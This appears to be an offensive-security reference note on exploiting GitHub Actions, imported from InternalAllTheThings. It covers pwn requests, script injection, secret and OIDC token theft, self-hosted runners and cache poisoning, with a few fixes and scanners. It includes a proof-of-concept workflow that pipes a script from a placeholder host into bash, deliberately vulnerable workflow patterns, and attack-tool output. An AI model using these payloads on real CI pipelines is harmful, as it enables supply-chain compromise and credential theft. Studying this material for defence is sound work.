---
title: CI/CD - GitHub Actions
type: technique
tags: [cicd, cloud, exploitation, linux, reference-import]
phase: exploitation
date_created: 2026-05-13
date_updated: 2026-07-02
sources: [InternalAllTheThings, orca-pull-request-nightmare, stepsecurity-pwn-request, hive-gha-cache-poisoning]
---

# CI/CD - GitHub Actions

## What it is

GitHub Actions is GitHub’s built-in CI/CD automation tool that lets you build, test, and deploy your code right from your GitHub repository. It runs workflows triggered by events like code pushes, pull requests, or manual triggers.

## How it works

GitHub Actions workflows execute on runners that receive repository secrets as environment variables; a workflow triggered by `pull_request_target` or `workflow_run` events from an untrusted fork can access these secrets if not properly scoped. Attackers inject malicious steps by submitting a pull request that modifies workflow files, or by exploiting script injection via unquoted `${{ github.event.* }}` expressions that interpolate attacker-controlled values directly into shell commands. The `GITHUB_TOKEN` and any configured cloud credentials (AWS, Azure, GCP) in the repository secrets are the primary targets.

## Attack phases

- **Exploitation**: primary phase for this note (credential and control-plane abuse)
- **Adjacent phases**: overlaps are common once credentials or lateral paths appear

## Prerequisites

Authorized scope covering the depicted systems; valid credentials or network reach as required by each command block inside the methodology body.

## Methodology

The following imported sections retain upstream ordering, tables, and copy-pasta blocks from InternalAllTheThings.

GitHub Actions is GitHub’s built-in CI/CD automation tool that lets you build, test, and deploy your code right from your GitHub repository. It runs workflows triggered by events like code pushes, pull requests, or manual triggers.

## Lab

* [messypoutine/gravy-overflow](https://github.com/messypoutine/gravy-overflow/) - A GitHub Actions Supply Chain CTF / Goat

## Default Action

The configuration files for GH actions are located in the directory `.github/workflows/`

You can tell if the action builds pull requests based on its trigger (`on`) instructions:

```yaml
on:
  push:
    branches:
      - master
  pull_request:
```

In order to run a command in an action that builds pull requests, add a `run` instruction to it.

```yaml
jobs:
  print_issue_title:
    runs-on: ubuntu-latest
    name: Command execution
    steps:
    - run: echo whoami"
```

`workflow_dispatch` is a special trigger in GitHub Actions that allows you to manually trigger a workflow from the GitHub UI or via the GitHub API.

```yml
name: example
on:
  workflow_dispatch:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]

jobs:
  build:
    runs-on: windows-2019

    steps:
      - name: Execute
        run: |
          whoami
```

## Misconfigured Actions

Analyze repositories to find misconfigured Github actions.

* [synacktiv/octoscan](https://github.com/synacktiv/octoscan) - Octoscan is a static vulnerability scanner for GitHub action workflows.
* [boostsecurityio/poutine](https://github.com/boostsecurityio/poutine) - Poutine is a security scanner that detects misconfigurations and vulnerabilities in the build pipelines of a repository. It supports parsing CI workflows from GitHub Actions and Gitlab CI/CD.

```ps1
# Using Docker
$ docker run ghcr.io/boostsecurityio/poutine:latest

# Analyze a local repository
$ poutine analyze_local .

# Analyze a remote GitHub repository
$ poutine -token "$GH_TOKEN" analyze_repo messypoutine/gravy-overflow

# Analyze all repositories in a GitHub organization
$ poutine -token "$GH_TOKEN" analyze_org messypoutine

# Analyze all projects in a self-hosted Gitlab instance
$ poutine -token "$GL_TOKEN" -scm gitlab -scm-base-uri https://example.com org/repo
```

An attack-flow diagram (Stawinski) maps the chain: fork PR to runner compromise to secret/OIDC theft to downstream supply-chain push. Reconstruct it from the Pwn Request, OIDC Token Theft, and Cache Poisoning sections below.

### Repository Hijacking

When the action is using a non-existing action, Github username or organization.

```yaml
- uses: non-existing-org/checkout-action
```

> :warning: To protect against repojacking, GitHub employs a security mechanism that disallows the registration of previous repository names with 100 clones in the week before renaming or deleting the owner's account. [The GitHub Actions Worm: Compromising GitHub Repositories Through the Actions Dependency Tree - Asi Greenholts](https://www.paloaltonetworks.com/blog/prisma-cloud/github-actions-worm-dependencies/)

### Untrusted Input Evaluation

An action may be vulnerable to command injection if it dynamically evaluates untrusted input as part of its `run` instruction:

```yaml
jobs:
  print_issue_title:
    runs-on: ubuntu-latest
    name: Print issue title
    steps:
    - run: echo "${{github.event.issue.title}}"
```

### Extract Sensitive Variables and Secrets

**Variables** are used for non-sensitive configuration data. They are accessible only by GitHub Actions in the context of this environment by using the variable context.

**Secrets** are encrypted environment variables. They are accessible only by GitHub Actions in the context of this environment by using the secret context.

```yml
jobs:
  build:
    runs-on: ubuntu-latest
    environment: env
    steps:
      - name: Access Secrets
        env:
            SUPER_SECRET_TOKEN: ${{ secrets.SUPER_SECRET_TOKEN }}
        run: |
            echo SUPER_SECRET_TOKEN=$SUPER_SECRET_TOKEN >> local.properties
```

* [synacktiv/gh-hijack-runner](https://github.com/synacktiv/gh-hijack-runner) - A python script to create a fake GitHub runner and hijack pipeline jobs to leak CI/CD secrets.

## Self-Hosted Runners

A self-hosted runner for GitHub Actions is a machine that you manage and maintain to run workflows from your GitHub repository. Unlike GitHub's own hosted runners, which operate on GitHub's infrastructure, self-hosted runners run on your own infrastructure. This allows for more control over the hardware, operating system, software, and security of the runner environment.

Scan a public GitHub Organization for Self-Hosted Runners

* [AdnaneKhan/Gato-X](https://github.com/AdnaneKhan/Gato-X) - Fork of Gato - Gato (Github Attack TOolkit) - Extreme Edition
* [praetorian-inc/gato](https://github.com/praetorian-inc/gato) - GitHub Actions Pipeline Enumeration and Attack Tool

```ps1
gato -s enumerate -t targetOrg -oJ target_org_gato.json
```

There are 2 types of self-hosted runners: non-ephemeral and ephemeral.

* **Ephemeral** runners are short-lived, created to handle a single or limited number of jobs before being terminated. They provide isolation, scalability, and enhanced security since each job runs in a clean environment.
* **Non-ephemeral** runners are long-lived, designed to handle multiple jobs over time. They offer consistency, customization, and can be cost-effective in stable environments where the overhead of provisioning new runners is unnecessary.

Identify the type of self-hosted runner with `gato`:

```ps1
gato e --repository vercel/next.js
[+] The authenticated user is: swisskyrepo
[+] The GitHub Classic PAT has the following scopes: repo, workflow
    - Enumerating: vercel/next.js!
[+] The repository contains a workflow: build_and_deploy.yml that might execute on self-hosted runners!
[+] The repository vercel/next.js contains a previous workflow run that executed on a self-hosted runner!
    - The runner name was: nextjs-hel1-22 and the machine name was nextjs-hel1-22 and the runner type was repository in the Default group with the following labels: self-hosted, linux, x64, metal
[!] The repository contains a non-ephemeral self-hosted runner!
[-] The user can only pull from the repository, but forking is allowed! Only a fork pull-request based attack would be possible.
```

Example of workflow to run on a non-ephemeral runner:

```yml
name: POC
on:
  pull_request:
  
jobs:
  security:
    runs-on: non-ephemeral-runner-name

    steps:
      - name: cmd-exec
        run: |
          curl -k https://ip.ip.ip.ip/exec.sh | bash
```

## Pwn Request (pull_request_target)

`pull_request_target` runs in the context of the BASE repo (write `GITHUB_TOKEN` plus secrets) but can be tricked into checking out and executing UNTRUSTED fork code. This is the highest-impact GitHub Actions bug class.

Vulnerable pattern (checks out the fork HEAD, then runs it with secrets in scope):

```yaml
on:
  pull_request_target:
    branches: [main]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.ref }}
          repository: ${{ github.event.pull_request.head.repo.full_name }}
      - run: make build      # executes attacker code from the fork
```

Exploit: fork the repo, add a malicious build step or edit a script the workflow runs, open a PR. The job runs with `GITHUB_TOKEN` write plus repo secrets; exfiltrate `env`, the token, and any cloud credentials. Fix: use `pull_request` (read-only, no secrets) for untrusted code; never check out the PR head under `pull_request_target` with secrets in scope; set `permissions: contents: read`; require manual approval or `environment` protection for fork PRs.

## Poisoned Pipeline Execution (PPE)

Indirect PPE modifies a file the pipeline already executes (`Makefile`, `package.json` scripts, `build.gradle`) instead of `.github/workflows/`, bypassing CODEOWNERS protection on workflow files while still achieving code execution in CI.

## OIDC Token Theft to Cloud

Workflows that assume a cloud role via OIDC (`permissions: id-token: write`) mint a short-lived token through `ACTIONS_ID_TOKEN_REQUEST_TOKEN` and `ACTIONS_ID_TOKEN_REQUEST_URL`. Code running in the job (including via a pwn request) can request and exfiltrate that OIDC token, then assume the cloud role off-box. Over-broad trust policies (wildcard `sub`, any-branch, any-repo) let an attacker-controlled fork or branch assume the role directly.

## Cache Poisoning (fork-to-base trust boundary)

`actions/cache` is shared across the fork/base boundary. A fork-triggered job can write a poisoned cache entry that a later trusted base job restores, injecting tampered dependencies or binaries into the trusted build. Real chain (2025): 84 malicious versions across 42 `@tanstack/*` npm packages were published by combining a `pull_request_target` untrusted checkout, cross-boundary cache poisoning, and runtime extraction of the OIDC npm-publish token.

## References

* [GITHUB ACTIONS EXPLOITATION: SELF HOSTED RUNNERS - Hugo Vincent - 17/07/2024](https://www.synacktiv.com/publications/github-actions-exploitation-self-hosted-runners)
* [GITHUB ACTIONS EXPLOITATION: REPO JACKING AND ENVIRONMENT MANIPULATION - Hugo Vincent - 10/07/2024](https://www.synacktiv.com/publications/github-actions-exploitation-repo-jacking-and-environment-manipulation)
* [GITHUB ACTIONS EXPLOITATION: DEPENDABOT - Hugo Vincent - 06/08/2024](https://www.synacktiv.com/publications/github-actions-exploitation-dependabot)
* [Weaponizing Dependabot: Pwn Request at its finest - Sébastien Graveline - 02/06/2025](https://boostsecurity.io/blog/weaponizing-dependabot-pwn-request-at-its-finest)

## Bypasses and variants

Enumerate case-specific bypasses inside the methodologies above when upstream documented alternate paths.

## Detection and defence

Apply vendor baselines for logging, least privilege, patch cadence, and segmentation. Map signals to SOC playbooks relevant to each platform referenced in this page.

## Tools

Tool references are inline in **Methodology**; see the `tools/` pages for CLI usage.

## Sources

- Swisskyrepo [InternalAllTheThings](https://github.com/swisskyrepo/InternalAllTheThings) (ingest slug `InternalAllTheThings`).
